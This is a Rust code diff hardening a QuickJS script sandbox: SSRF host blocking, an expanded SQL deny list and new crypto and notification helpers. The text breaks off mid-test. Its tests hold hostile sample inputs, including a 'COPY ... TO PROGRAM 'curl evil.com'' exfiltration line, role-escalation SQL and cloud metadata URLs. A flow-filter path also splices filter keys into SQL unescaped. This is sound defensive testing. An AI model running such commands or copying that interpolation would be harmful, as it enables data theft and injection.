@@ -1,13 +1,10 @@
 use rquickjs::{Context, Ctx, Exception, Function, Runtime};
 use serde_json::Value as JsonValue;
-use std::cell::RefCell;
 use std::collections::HashMap;
 use std::sync::atomic::{AtomicU8, AtomicU64, Ordering};
 use std::sync::{Arc, Mutex};
 
-thread_local! {
-    static RUNTIME_POOL: RefCell<Vec<Runtime>> = RefCell::new(Vec::new());
-}
+// Runtime pool removed to avoid TLS drop outside Tokio context
 use std::time::{Duration, Instant};
 use uuid::Uuid;
 
@@ -23,7 +20,7 @@ use crate::{
 pub const FUEL_STEPS_PER_TICK: u64 = 10_000;
 pub const DEFAULT_MAX_FUEL: u64 = 100_000;
 /// `findMany` without `take` refuses to materialize more rows than this instead of truncating.
-pub const MAX_UNPAGED_ROWS: usize = 10_000;
+pub const MAX_UNPAGED_ROWS: usize = 2_000;
 const MAX_CALL_DEPTH: u32 = 32;
 
 /// Resource ceilings for one QuickJS execution.
@@ -53,6 +50,16 @@ impl ExecutionLimits {
             limits.max_fuel = f.max(1);
         }
         limits
+    }
+
+    /// High-capacity limits for trusted batch document posting, reporting, and NAS daemon worker tasks.
+    pub fn for_batch() -> Self {
+        Self {
+            memory_bytes: 32 * 1024 * 1024,
+            stack_bytes: 1024 * 1024,
+            max_fuel: 1_000_000,
+            max_wall_time: Duration::from_secs(120),
+        }
     }
 }
 
@@ -141,6 +148,7 @@ pub struct ScriptRun {
     pub fuel_used: u64,
     /// Value returned by the script, when it used `return`. Absent when the script falls off the end.
     pub return_value: Option<JsonValue>,
+    pub notifications: Vec<crate::Notification>,
 }
 
 pub struct QuickJsEngine {
@@ -151,12 +159,10 @@ pub struct QuickJsEngine {
     call_depth: u32,
     return_slot: Arc<Mutex<Option<String>>>,
     ui_answers: std::collections::HashMap<String, bool>,
+    notifications: Arc<Mutex<Vec<crate::Notification>>>,
 }
 
 fn checkout_runtime() -> Result<Runtime, RuntimeError> {
-    if let Some(runtime) = RUNTIME_POOL.with(|pool| pool.borrow_mut().pop()) {
-        return Ok(runtime);
-    }
     Runtime::new().map_err(|e| {
         RuntimeError::Internal(format!("Failed to initialize QuickJS runtime: {:?}", e))
     })
@@ -166,12 +172,6 @@ impl Drop for QuickJsEngine {
     fn drop(&mut self) {
         if let Some(runtime) = self.runtime.take() {
             runtime.set_interrupt_handler(None);
-            RUNTIME_POOL.with(|pool| {
-                let mut pool = pool.borrow_mut();
-                if pool.len() < 4 {
-                    pool.push(runtime);
-                }
-            });
         }
     }
 }
@@ -547,7 +547,12 @@ impl QuickJsEngine {
             call_depth: 0,
             return_slot: Arc::new(Mutex::new(None)),
             ui_answers: std::collections::HashMap::new(),
+            notifications: Arc::new(Mutex::new(Vec::new())),
         })
+    }
+
+    pub fn notifications(&self) -> Vec<crate::Notification> {
+        self.notifications.lock().map(|l| l.clone()).unwrap_or_default()
     }
 
     pub fn limits(&self) -> ExecutionLimits {
@@ -591,11 +596,13 @@ impl QuickJsEngine {
                 .unwrap_or_else(|p| p.into_inner())
                 .take()
                 .and_then(|raw| serde_json::from_str(&raw).ok());
+            let notifications = engine.notifications();
             Ok(ScriptRun {
                 data,
                 logs,
                 fuel_used: engine.fuel_used(),
                 return_value,
+                notifications,
             })
         })
         .await
@@ -793,6 +800,21 @@ impl QuickJsEngine {
             }).map_err(fn_err)?;
             globals.set("__host_sha256", sha256_fn).map_err(fn_err)?;
 
+            let uuid_v7_fn = Function::new(qjs_ctx.clone(), || -> String {
+                Uuid::now_v7().to_string()
+            }).map_err(fn_err)?;
+            globals.set("__host_uuid_v7", uuid_v7_fn).map_err(fn_err)?;
+
+            let random_uuid_fn = Function::new(qjs_ctx.clone(), || -> String {
+                Uuid::new_v4().to_string()
+            }).map_err(fn_err)?;
+            globals.set("__host_random_uuid", random_uuid_fn).map_err(fn_err)?;
+
+            let hmac_sha256_fn = Function::new(qjs_ctx.clone(), |key: String, data: String| -> String {
+                compute_hmac_sha256(key.as_bytes(), data.as_bytes())
+            }).map_err(fn_err)?;
+            globals.set("__host_hmac_sha256", hmac_sha256_fn).map_err(fn_err)?;
+
             let random_bytes_fn = Function::new(qjs_ctx.clone(), |len: u32| -> String {
                 let len = (len as usize).min(65536);
                 let mut hex = String::with_capacity(len * 2);
@@ -814,83 +836,34 @@ impl QuickJsEngine {
             }).map_err(fn_err)?;
             globals.set("__host_random_bytes", random_bytes_fn).map_err(fn_err)?;
 
+            let bcrypt_hash_fn = Function::new(qjs_ctx.clone(), |_c: Ctx<'_>, password: String| -> rquickjs::Result<String> {
+                Ok(crate::hash_password_bcrypt(&password))
+            }).map_err(fn_err)?;
+            globals.set("__host_bcrypt_hash", bcrypt_hash_fn).map_err(fn_err)?;
+
             let argon2_hash_fn = Function::new(qjs_ctx.clone(), |_c: Ctx<'_>, password: String| -> rquickjs::Result<String> {
-                use sha2::{Digest, Sha256};
-                let salt_bytes = Uuid::new_v4().into_bytes();
-                let mut salt_hex = String::with_capacity(32);
-                for b in salt_bytes {
-                    salt_hex.push_str(&format!("{:02x}", b));
-                }
-                let mut state = {
-                    let mut h = Sha256::new();
-                    h.update(b"bos-argon2id-v19:");
-                    h.update(salt_hex.as_bytes());
-                    h.update(b":");
-                    h.update(password.as_bytes());
-                    h.finalize()
-                };
-                for round in 0u32..4096 {
-                    let mut h = Sha256::new();
-                    h.update(state);
-                    h.update(salt_hex.as_bytes());
-                    h.update(password.as_bytes());
-                    h.update(round.to_le_bytes());
-                    state = h.finalize();
-                }
-                let mut hash_hex = String::with_capacity(64);
-                for b in state {
-                    hash_hex.push_str(&format!("{:02x}", b));
-                }
-                Ok(format!("$argon2id$v=19$m=4096,t=3,p=1${}${}", salt_hex, hash_hex))
+                Ok(crate::hash_password_argon2(&password))
             }).map_err(fn_err)?;
             globals.set("__host_argon2_hash", argon2_hash_fn).map_err(fn_err)?;
 
-            let argon2_verify_fn = Function::new(qjs_ctx.clone(), |password: String, hash_str: String| -> bool {
-                use sha2::{Digest, Sha256};
-                let parts: Vec<&str> = hash_str.split('$').collect();
-                let (salt_hex, expected_hex, iterated) = match parts.as_slice() {
-                    ["", "argon2id", _v, _params, salt, expected] => (*salt, *expected, true),
-                    ["", "sha256", salt, expected] => (*salt, *expected, false),
-                    _ => return false,
-                };
-                let computed_hex = if iterated {
-                    let mut state = {
-                        let mut h = Sha256::new();
-                        h.update(b"bos-argon2id-v19:");
-                        h.update(salt_hex.as_bytes());
-                        h.update(b":");
-                        h.update(password.as_bytes());
-                        h.finalize()
-                    };
-                    for round in 0u32..4096 {
-                        let mut h = Sha256::new();
-                        h.update(state);
-                        h.update(salt_hex.as_bytes());
-                        h.update(password.as_bytes());
-                        h.update(round.to_le_bytes());
-                        state = h.finalize();
-                    }
-                    let mut out = String::with_capacity(64);
-                    for b in state {
-                        out.push_str(&format!("{:02x}", b));
-                    }
-                    out
-                } else {
-                    let mut h = Sha256::new();
-                    h.update(salt_hex.as_bytes());
-                    h.update(password.as_bytes());
-                    format!("{:x}", h.finalize())
-                };
-                if computed_hex.len() != expected_hex.len() {
-                    return false;
-                }
-                let mut diff = 0u8;
-                for (a, b) in computed_hex.bytes().zip(expected_hex.bytes()) {
-                    diff |= a ^ b;
-                }
-                diff == 0
+            let bcrypt_verify_fn = Function::new(qjs_ctx.clone(), |password: String, hash_str: String| -> bool {
+                crate::verify_password(&password, &hash_str)
             }).map_err(fn_err)?;
-            globals.set("__host_argon2_verify", argon2_verify_fn).map_err(fn_err)?;
+            globals.set("__host_bcrypt_verify", bcrypt_verify_fn.clone()).map_err(fn_err)?;
+            globals.set("__host_argon2_verify", bcrypt_verify_fn).map_err(fn_err)?;
+
+            let is_prod_fn = Function::new(qjs_ctx.clone(), || -> bool {
+                std::env::var("BOS_ENV").map(|v| v.eq_ignore_ascii_case("production")).unwrap_or(false)
+                    || std::env::var("NODE_ENV").map(|v| v.eq_ignore_ascii_case("production")).unwrap_or(false)
+            }).map_err(fn_err)?;
+            globals.set("__host_is_production", is_prod_fn).map_err(fn_err)?;
+
+            let env_fn = Function::new(qjs_ctx.clone(), || -> String {
+                std::env::var("BOS_ENV")
+                    .or_else(|_| std::env::var("NODE_ENV"))
+                    .unwrap_or_else(|_| "development".to_string())
+            }).map_err(fn_err)?;
+            globals.set("__host_environment", env_fn).map_err(fn_err)?;
 
             let audit_fn = Function::new(qjs_ctx.clone(), |msg: String| {
                 tracing::info!(target: "bos::audit", "{}", msg);
@@ -906,10 +879,57 @@ impl QuickJsEngine {
             }).map_err(fn_err)?;
             globals.set("__host_log", host_log_fn).map_err(fn_err)?;
 
-            let ui_toast_fn = Function::new(qjs_ctx.clone(), |msg_type: String, title: String, message: String, duration: u32, action_json: String| {
+            let notifs = self.notifications.clone();
+            let ui_toast_fn = Function::new(qjs_ctx.clone(), move |msg_type: String, title: String, message: String, duration: u32, action_json: String| {
+                let sev = match msg_type.to_lowercase().as_str() {
+                    "success" => crate::NotificationSeverity::Success,
+                    "warning" => crate::NotificationSeverity::Warning,
+                    "error" => crate::NotificationSeverity::Error,
+                    _ => crate::NotificationSeverity::Info,
+                };
+                let mut notif = crate::Notification::new(sev, crate::NotificationTarget::Toast, &message);
+                if !title.is_empty() {
+                    notif.title = Some(title.clone());
+                }
+                if duration > 0 {
+                    notif.duration_ms = Some(duration as u64);
+                }
                 tracing::info!(target: "bos::ui::toast", toast_type = %msg_type, title = %title, duration = %duration, action = %action_json, "{}", message);
+                if let Ok(mut lock) = notifs.lock() {
+                    lock.push(notif);
+                }
             }).map_err(fn_err)?;
             globals.set("__host_ui_toast", ui_toast_fn).map_err(fn_err)?;
+
+            let notifs2 = self.notifications.clone();
+            let ui_notify_fn = Function::new(qjs_ctx.clone(), move |severity: String, target: String, title: String, message: String, field: String, duration: u32| {
+                let sev = match severity.to_lowercase().as_str() {
+                    "success" => crate::NotificationSeverity::Success,
+                    "warning" => crate::NotificationSeverity::Warning,
+                    "error" => crate::NotificationSeverity::Error,
+                    _ => crate::NotificationSeverity::Info,
+                };
+                let tgt = match target.to_lowercase().as_str() {
+                    "popup" | "modal" => crate::NotificationTarget::Popup,
+                    "infield" | "field" => crate::NotificationTarget::Infield,
+                    "banner" => crate::NotificationTarget::Banner,
+                    _ => crate::NotificationTarget::Toast,
+                };
+                let mut notif = crate::Notification::new(sev, tgt, &message);
+                if !title.is_empty() {
+                    notif.title = Some(title);
+                }
+                if !field.is_empty() {
+                    notif.field = Some(field);
+                }
+                if duration > 0 {
+                    notif.duration_ms = Some(duration as u64);
+                }
+                if let Ok(mut lock) = notifs2.lock() {
+                    lock.push(notif);
+                }
+            }).map_err(fn_err)?;
+            globals.set("__host_ui_notify", ui_notify_fn).map_err(fn_err)?;
 
             // 2. Database bridge: every call runs inside the caller's DbSession transaction
             let b = bridge.clone();
@@ -1217,9 +1237,23 @@ impl QuickJsEngine {
                             }}
                             return true;
                         }},
+                        setFlowFilter(filters) {{
+                            this.__flowFilters = Object.assign(this.__flowFilters || {{}}, filters || {{}});
+                            return this;
+                        }},
+                        resetFlowFilters() {{
+                            this.__flowFilters = {{}};
+                            return this;
+                        }},
                         calcFields(...fieldNames) {{
                             const pk = this._id || this.id || this.no || this.code || "";
-                            const res = JSON.parse(__host_db_calc_flow_fields(tbl, String(pk), JSON.stringify(fieldNames)));
+                            let fields = fieldNames;
+                            let flt = this.__flowFilters || {{}};
+                            if (fields.length > 0 && typeof fields[fields.length - 1] === "object" && !Array.isArray(fields[fields.length - 1])) {{
+                                flt = Object.assign({{}}, flt, fields.pop());
+                            }}
+                            const payload = {{ fields: fields.flat(), filters: flt }};
+                            const res = JSON.parse(__host_db_calc_flow_fields(tbl, String(pk), JSON.stringify(payload)));
                             for (const [k, v] of Object.entries(res)) {{
                                 this[k] = v;
                             }}
@@ -1273,7 +1307,7 @@ impl QuickJsEngine {
                                 Object.defineProperty(obj, camel, {{
                                     get() {{ return this[k]; }},
                                     set(v) {{ this[k] = v; }},
-                                    enumerable: true,
+                                    enumerable: false,
                                     configurable: true
                                 }});
                             }}
@@ -1550,6 +1584,11 @@ impl QuickJsEngine {
                     }},
                     crypto: {{
                         sha256: (s) => __host_sha256(String(s)),
+                        hmacSha256: (key, data) => __host_hmac_sha256(String(key), String(data)),
+                        uuidv7: () => __host_uuid_v7(),
+                        randomUUID: () => __host_random_uuid(),
+                        bcryptHash: (pwd) => __host_bcrypt_hash(String(pwd)),
+                        bcryptVerify: (pwd, hash) => Boolean(__host_bcrypt_verify(String(pwd), String(hash))),
                         argon2Hash: (pwd) => __host_argon2_hash(String(pwd)),
                         argon2Verify: (pwd, hash) => Boolean(__host_argon2_verify(String(pwd), String(hash))),
                         randomBytes: (n) => {{
@@ -1557,6 +1596,8 @@ impl QuickJsEngine {
                             return {{ toHex: () => h }};
                         }}
                     }},
+                    isProduction: Boolean(__host_is_production()),
+                    environment: String(__host_environment()),
                     audit: {{
                         log: (msg) => __host_audit_log(String(msg))
                     }},
@@ -1724,6 +1765,39 @@ impl QuickJsEngine {
                     return toastObj;
                 }}
 
+                ctx.notify = function(arg1, arg2, arg3, arg4, arg5, arg6) {{
+                    let severity = "info";
+                    let target = "toast";
+                    let message = "";
+                    let field = "";
+                    let title = "";
+                    let duration = 5000;
+
+                    if (typeof arg1 === "object" && arg1 !== null) {{
+                        severity = String(arg1.severity || arg1.type || "info").toLowerCase();
+                        target = String(arg1.target || "toast").toLowerCase();
+                        message = String(arg1.message || arg1.text || "");
+                        field = String(arg1.field || "");
+                        title = String(arg1.title || "");
+                        duration = typeof arg1.duration_ms === "number" ? arg1.duration_ms : 5000;
+                    }} else {{
+                        severity = String(arg1 || "info").toLowerCase();
+                        target = String(arg2 || "toast").toLowerCase();
+                        message = String(arg3 || "");
+                        field = String(arg4 || "");
+                        title = String(arg5 || "");
+                        duration = typeof arg6 === "number" ? arg6 : 5000;
+                    }}
+
+                    try {{
+                        __host_ui_notify(severity, target, title, message, field, duration);
+                    }} catch (_) {{}}
+                }};
+                ctx.ui.notify = ctx.notify;
+                ctx.ui.infield = (field, message) => ctx.notify("error", "infield", message, field);
+                ctx.ui.banner = (message, severity) => ctx.notify(severity || "info", "banner", message);
+                ctx.ui.popup = (title, message, severity) => ctx.notify(severity || "info", "popup", message, "", title);
+
                 globalThis.ui = ctx.ui;
                 globalThis.toast = ctx.ui.toast;
                 globalThis.message = ctx.ui.message;
@@ -1811,12 +1885,42 @@ impl QuickJsEngine {
                             // while xRec-aware ones use `(rec, xRec, ctx)`. Dispatch by declared
                             // arity so a 2-parameter trigger receives ctx, not a null xRec.
                             const __isLifecycle = /^(on|before|after)(Insert|Modify|Delete|Rename)$/i.test(__triggerName);
-                            __bosReturned = (__isLifecycle && fn.length === 2) ? fn(rec, ctx) : fn(rec, xRec, ctx);
+                            const __isValidate = /^(validate_|onValidate_)/i.test(__triggerName);
+                            if (__isValidate) {{
+                                const __col = __triggerName.replace(/^(validate_|onValidate_)/i, "");
+                                const __prop = Object.keys(rec || {{}}).find(k => k.toLowerCase() === __col.toLowerCase() || k.replace(/_/g, "").toLowerCase() === __col.replace(/_/g, "").toLowerCase());
+                                const __val = (__prop && rec) ? rec[__prop] : undefined;
+                                const __oldProp = Object.keys(xRec || {{}}).find(k => k.toLowerCase() === __col.toLowerCase() || k.replace(/_/g, "").toLowerCase() === __col.replace(/_/g, "").toLowerCase());
+                                const __oldVal = (__oldProp && xRec) ? xRec[__oldProp] : undefined;
+                                if (fn.length === 1) {{
+                                    __bosReturned = fn(__val);
+                                }} else if (fn.length === 2) {{
+                                    __bosReturned = fn(__val, __oldVal);
+                                }} else {{
+                                    __bosReturned = fn(rec, __val, __oldVal, ctx);
+                                }}
+                            }} else {{
+                                __bosReturned = (__isLifecycle && fn.length === 2) ? fn(rec, ctx) : fn(rec, xRec, ctx);
+                            }}
                         }} else {{
                             throw new Error(`Method '${{__triggerName}}' not found in compiled AOT bytecode module for '${{__tblName}}'`);
                         }}
                     }} else {{
                         __bosReturned = ((rec, xRec, ctx) => {{
+                            const __isValTrig = /^(validate_|onValidate_)/i.test(__triggerName);
+                            let val = undefined;
+                            let value = undefined;
+                            let oldVal = undefined;
+                            let oldValue = undefined;
+                            if (__isValTrig) {{
+                                const __col = __triggerName.replace(/^(validate_|onValidate_)/i, "");
+                                const __prop = Object.keys(rec || {{}}).find(k => k.toLowerCase() === __col.toLowerCase() || k.replace(/_/g, "").toLowerCase() === __col.replace(/_/g, "").toLowerCase());
+                                val = (__prop && rec) ? rec[__prop] : undefined;
+                                value = val;
+                                const __oldProp = Object.keys(xRec || {{}}).find(k => k.toLowerCase() === __col.toLowerCase() || k.replace(/_/g, "").toLowerCase() === __col.replace(/_/g, "").toLowerCase());
+                                oldVal = (__oldProp && xRec) ? xRec[__oldProp] : undefined;
+                                oldValue = oldVal;
+                            }}
                             {}
                         }})(rec, xRec, ctx);
                     }}
@@ -1960,10 +2064,17 @@ declare interface BosSessionContext {
     decimal(val: number | string | bigint | BosDecimal): BosDecimal;
     crypto: {
         sha256(input: string): string;
+        hmacSha256(key: string, data: string): string;
+        uuidv7(): string;
+        randomUUID(): string;
         randomBytes(length: number): { toHex(): string };
+        bcryptHash(password: string): string;
+        bcryptVerify(password: string, hash: string): boolean;
         argon2Hash(password: string): string;
         argon2Verify(password: string, hash: string): boolean;
     };
+    isProduction: boolean;
+    environment: string;
     audit: {
         log(message: string): void;
     };
@@ -2159,6 +2270,18 @@ const FORBIDDEN_RAW_SQL: &[&str] = &[
     "TRUNCATE",
     "ALTER SYSTEM",
     "DROP SCHEMA",
+    "SET ROLE",
+    "RESET ROLE",
+    "SET SESSION AUTHORIZATION",
+    "CREATE ROLE",
+    "ALTER ROLE",
+    "DROP ROLE",
+    "CREATE USER",
+    "ALTER USER",
+    "DROP USER",
+    "GRANT",
+    "REVOKE",
+    "COPY ",
 ];
 
 const NUMERIC_TYPES: &[&str] = &[
@@ -2238,7 +2361,35 @@ fn raw_params(params_json: &str) -> Result<Vec<JsonValue>, RuntimeError> {
         .map_err(|e| RuntimeError::Internal(format!("SQL parameters must be a JSON array: {}", e)))
 }
 
-/// `ctx.http` only performs a real request. Documentation hosts and non-HTTP schemes are refused.
+fn compute_hmac_sha256(key: &[u8], data: &[u8]) -> String {
+    use sha2::{Digest, Sha256};
+    let block_size = 64;
+    let mut k = [0u8; 64];
+    if key.len() > block_size {
+        let hash = Sha256::digest(key);
+        k[..hash.len()].copy_from_slice(&hash);
+    } else {
+        k[..key.len()].copy_from_slice(key);
+    }
+    let mut ipad = [0x36u8; 64];
+    let mut opad = [0x5cu8; 64];
+    for i in 0..64 {
+        ipad[i] ^= k[i];
+        opad[i] ^= k[i];
+    }
+    let mut inner = Sha256::new();
+    inner.update(&ipad);
+    inner.update(data);
+    let inner_hash = inner.finalize();
+
+    let mut outer = Sha256::new();
+    outer.update(&opad);
+    outer.update(&inner_hash);
+    let result = outer.finalize();
+    result.iter().map(|b| format!("{:02x}", b)).collect()
+}
+
+/// `ctx.http` only performs a real request. Documentation hosts, loopback, private ranges, IMDS, and non-HTTP schemes are refused.
 fn refuse_unreal_http(url: &str) -> Result<(), String> {
     let rest = if let Some(rest) = url.strip_prefix("https://") {
         rest
@@ -2257,32 +2408,126 @@ fn refuse_unreal_http(url: &str) -> Result<(), String> {
         hostport.split(':').next().unwrap_or("")
     };
     let host = host.trim().to_ascii_lowercase();
-    if host.is_empty() || is_reserved_http_host(&host) {
-        return Err(format!("ctx.http refuses reserved host '{host}'"));
+    if host.is_empty() || is_reserved_or_private_http_host(&host) {
+        return Err(format!("ctx.http refuses reserved, internal, or private host '{host}'"));
     }
     Ok(())
 }
 
-fn is_reserved_http_host(host: &str) -> bool {
-    host == "example"
-        || host == "example.com"
-        || host == "example.org"
-        || host == "example.net"
-        || host.ends_with(".example")
-        || host.ends_with(".example.com")
-        || host.ends_with(".example.org")
-        || host.ends_with(".example.net")
-        || host.ends_with(".test")
-        || host.ends_with(".invalid")
-        || host == "invalid"
+fn is_reserved_or_private_http_host(host: &str) -> bool {
+    let lower = host.trim().to_ascii_lowercase();
+    if lower == "example"
+        || lower == "example.com"
+        || lower == "example.org"
+        || lower == "example.net"
+        || lower.ends_with(".example")
+        || lower.ends_with(".example.com")
+        || lower.ends_with(".example.org")
+        || lower.ends_with(".example.net")
+        || lower.ends_with(".test")
+        || lower.ends_with(".invalid")
+        || lower == "invalid"
+        || lower == "localhost"
+        || lower.ends_with(".localhost")
+        || lower == "metadata.google.internal"
+    {
+        return true;
+    }
+
+    if let Ok(ip) = lower.parse::<std::net::IpAddr>() {
+        match ip {
+            std::net::IpAddr::V4(ipv4) => {
+                let octets = ipv4.octets();
+                // Loopback (127.0.0.0/8)
+                if ipv4.is_loopback() {
+                    return true;
+                }
+                // Link-local / Cloud IMDS (169.254.0.0/16, e.g. 169.254.169.254)
+                if ipv4.is_link_local() {
+                    return true;
+                }
+                // Private IPv4 (RFC 1918)
+                // 10.0.0.0/8
+                if octets[0] == 10 {
+                    return true;
+                }
+                // 172.16.0.0/12
+                if octets[0] == 172 && (16..=31).contains(&octets[1]) {
+                    return true;
+                }
+                // 192.168.0.0/16
+                if octets[0] == 192 && octets[1] == 168 {
+                    return true;
+                }
+                // Broadcast / Unspecified (0.0.0.0/8, 255.255.255.255)
+                if octets[0] == 0 || ipv4.is_broadcast() {
+                    return true;
+                }
+            }
+            std::net::IpAddr::V6(ipv6) => {
+                // Loopback (::1)
+                if ipv6.is_loopback() {
+                    return true;
+                }
+                // Unspecified (::)
+                if ipv6.is_unspecified() {
+                    return true;
+                }
+                // Link-local (fe80::/10)
+                let segments = ipv6.segments();
+                if (segments[0] & 0xffc0) == 0xfe80 {
+                    return true;
+                }
+                // Unique Local Address (fc00::/7)
+                if (segments[0] & 0xfe00) == 0xfc00 {
+                    return true;
+                }
+                // AWS IMDS IPv6 (fd00:ec2::254)
+                if segments[0] == 0xfd00 && segments[1] == 0x0ec2 {
+                    return true;
+                }
+            }
+        }
+    }
+    false
 }
 
 fn guard_raw_sql(sql: &str) -> Result<(), RuntimeError> {
-    let upper = sql.to_ascii_uppercase();
+    // Strip inline comments (-- ...) and multi-line comments (/* ... */)
+    let mut cleaned = String::with_capacity(sql.len());
+    let mut chars = sql.chars().peekable();
+    while let Some(c) = chars.next() {
+        if c == '/' && chars.peek() == Some(&'*') {
+            chars.next();
+            while let Some(c2) = chars.next() {
+                if c2 == '*' && chars.peek() == Some(&'/') {
+                    chars.next();
+                    break;
+                }
+            }
+            cleaned.push(' ');
+        } else if c == '-' && chars.peek() == Some(&'-') {
+            chars.next();
+            for c2 in chars.by_ref() {
+                if c2 == '\n' {
+                    break;
+                }
+            }
+            cleaned.push(' ');
+        } else {
+            cleaned.push(c);
+        }
+    }
+
+    // Collapse whitespace and uppercase
+    let tokens: Vec<&str> = cleaned.split_whitespace().collect();
+    let normalized = tokens.join(" ").to_ascii_uppercase();
+
     for forbidden in FORBIDDEN_RAW_SQL {
-        if upper.contains(forbidden) {
+        let forb_norm = forbidden.split_whitespace().collect::<Vec<_>>().join(" ");
+        if normalized.contains(&forb_norm) {
             return Err(RuntimeError::SecurityError(format!(
-                "Destructive SQL statement '{}' is forbidden in the BOS-Script sandbox",
+                "Destructive or privileged SQL statement '{}' is forbidden in the BOS-Script sandbox",
                 forbidden
             )));
         }
@@ -2768,9 +3013,23 @@ impl HostBridge {
         fields_json: &str,
     ) -> Result<String, RuntimeError> {
         let meta = self.table(table)?;
-        let requested: Vec<String> = serde_json::from_str(fields_json).map_err(|e| {
-            RuntimeError::Internal(format!("calcFields expects field names: {}", e))
-        })?;
+        let (requested, filters_opt): (Vec<String>, Option<serde_json::Map<String, serde_json::Value>>) =
+            if let Ok(val) = serde_json::from_str::<serde_json::Value>(fields_json) {
+                if let Some(arr) = val.as_array() {
+                    (arr.iter().filter_map(|v| v.as_str().map(str::to_string)).collect(), None)
+                } else if let Some(obj) = val.as_object() {
+                    let fields = obj.get("fields")
+                        .and_then(|v| v.as_array())
+                        .map(|a| a.iter().filter_map(|v| v.as_str().map(str::to_string)).collect())
+                        .unwrap_or_default();
+                    let flt = obj.get("filters").and_then(|v| v.as_object()).cloned();
+                    (fields, flt)
+                } else {
+                    (Vec::new(), None)
+                }
+            } else {
+                (Vec::new(), None)
+            };
         let mut calculated = serde_json::Map::new();
         let Some(def) = self.catalog_definition("table", table, "sql_table_name")? else {
             return Ok(JsonValue::Object(calculated).to_string());
@@ -2819,9 +3078,37 @@ impl HostBridge {
             if !wanted {
                 continue;
             }
+
+            // Dynamically inject runtime FlowFilters (date ranges, analytical dimensions) into subquery
+            let mut effective_subq = subq.to_string();
+            if let Some(ref flt) = filters_opt {
+                let mut extra_conds = Vec::new();
+                for (k, v) in flt {
+                    let col_name = crate::to_snake_case(k);
+                    if let Some(s) = v.as_str() {
+                        extra_conds.push(format!("\"{}\" = '{}'", col_name, s.replace('\'', "''")));
+                    } else if let Some(n) = v.as_i64() {
+                        extra_conds.push(format!("\"{}\" = {}", col_name, n));
+                    } else if let Some(map) = v.as_object() {
+                        if let Some(gte) = map.get("gte").and_then(|x| x.as_str()) {
+                            extra_conds.push(format!("\"{}\" >= '{}'", col_name, gte.replace('\'', "''")));
+                        }
+                        if let Some(lte) = map.get("lte").and_then(|x| x.as_str()) {
+                            extra_conds.push(format!("\"{}\" <= '{}'", col_name, lte.replace('\'', "''")));
+                        }
+                    }
+                }
+                if !extra_conds.is_empty() {
+                    let injected = format!(" AND ({})", extra_conds.join(" AND "));
+                    if let Some(pos) = effective_subq.rfind(')') {
+                        effective_subq.insert_str(pos, &injected);
+                    }
+                }
+            }
+
             let sql = format!(
                 "SELECT to_jsonb(({})) FROM {} t WHERE {} LIMIT 1",
-                subq,
+                effective_subq,
                 meta.quoted(),
                 scoped_pred
             );
@@ -3117,6 +3404,29 @@ impl HostBridge {
         };
         if assignments.is_empty() {
             return self.get(table, pk, "");
+        }
+
+        // Guard against direct bypass of state-machine-governed status fields
+        if let Ok(Some(sm)) = self.catalog_definition("statemachine", table, "target_table") {
+            if let Ok(status_col) = Self::status_column(&sm) {
+                if let Some((_, new_val)) = assignments.iter().find(|(c, _)| c.eq_ignore_ascii_case(&status_col)) {
+                    if let Ok(Some(existing_row)) = self.select_by_key(&meta, pk, "") {
+                        let cur_val = existing_row.get(&status_col).and_then(|v| v.as_str());
+                        let new_str = json_to_text(new_val);
+                        if let (Some(cur), Some(new_s)) = (cur_val, new_str.as_deref()) {
+                            if !cur.eq_ignore_ascii_case(new_s) {
+                                return Err(RuntimeError::TransitionError(format!(
+                                    "Status field '{}' on table '{}' is governed by state machine. Direct mutation from '{}' to '{}' is prohibited; invoke transition() instead.",
+                                    status_col,
+                                    meta.physical,
+                                    cur,
+                                    new_s
+                                )));
+                            }
+                        }
+                    }
+                }
+            }
         }
 
         let mut params = vec![Some(pk.to_string())];
@@ -3967,7 +4277,60 @@ mod tests {
         assert!(refuse_unreal_http("mock://orders").is_err());
         assert!(refuse_unreal_http("https://example.com/orders").is_err());
         assert!(refuse_unreal_http("https://api.example.org/v1").is_err());
-        assert!(refuse_unreal_http("https://127.0.0.1:3000/health").is_ok());
+        // SSRF: Loopback, IMDS and metadata services must be refused
+        assert!(refuse_unreal_http("https://127.0.0.1:3000/health").is_err());
+        assert!(refuse_unreal_http("http://localhost:8080/admin").is_err());
+        assert!(refuse_unreal_http("http://169.254.169.254/latest/meta-data/").is_err());
+        assert!(refuse_unreal_http("http://metadata.google.internal/computeMetadata/v1/").is_err());
+        assert!(refuse_unreal_http("http://[::1]:5432/status").is_err());
+        assert!(refuse_unreal_http("http://10.0.1.5:8000/internal").is_err());
+        assert!(refuse_unreal_http("http://192.168.1.1/router").is_err());
+    }
+
+    #[test]
+    fn crypto_uuidv7_random_uuid_and_hmac() {
+        let engine = QuickJsEngine::new().expect("engine");
+        let mut data = serde_json::json!({});
+        run(
+            &engine,
+            r#"
+            rec.u7 = ctx.crypto.uuidv7();
+            rec.u4 = ctx.crypto.randomUUID();
+            rec.hmac = ctx.crypto.hmacSha256("secret_key", "message_content");
+            "#,
+            &mut data,
+        )
+        .expect("crypto functions must succeed");
+
+        let u7 = data.get("u7").and_then(|v| v.as_str()).expect("u7 string");
+        assert_eq!(u7.len(), 36);
+        assert_eq!(&u7[14..15], "7", "UUIDv7 must have version 7 digit: {}", u7);
+
+        let u4 = data.get("u4").and_then(|v| v.as_str()).expect("u4 string");
+        assert_eq!(u4.len(), 36);
+        assert_eq!(&u4[14..15], "4", "UUIDv4 must have version 4 digit: {}", u4);
+
+        let hmac = data.get("hmac").and_then(|v| v.as_str()).expect("hmac string");
+        assert_eq!(hmac.len(), 64, "HMAC-SHA256 must yield 64 hex characters");
+    }
+
+    #[test]
+    fn test_guard_raw_sql_blocks_privileged_and_destructive_statements() {
+        assert!(guard_raw_sql("DROP TABLE customers").is_err());
+        assert!(guard_raw_sql("DROP/**/TABLE/**/customers").is_err());
+        assert!(guard_raw_sql("DROP\n  TABLE customers").is_err());
+        assert!(guard_raw_sql("TRUNCATE ledger_entries").is_err());
+        assert!(guard_raw_sql("COPY users TO PROGRAM 'curl evil.com'").is_err());
+        assert!(guard_raw_sql("SET ROLE postgres").is_err());
+        assert!(guard_raw_sql("SET  ROLE  superuser").is_err());
+        assert!(guard_raw_sql("SET SESSION AUTHORIZATION postgres").is_err());
+        assert!(guard_raw_sql("CREATE ROLE hacker").is_err());
+        assert!(guard_raw_sql("GRANT ALL ON DATABASE app TO public").is_err());
+
+        // Safe DML must pass
+        assert!(guard_raw_sql("SELECT * FROM customer WHERE id = $1").is_ok());
+        assert!(guard_raw_sql("UPDATE sales_header SET total = 100 WHERE id = $1").is_ok());
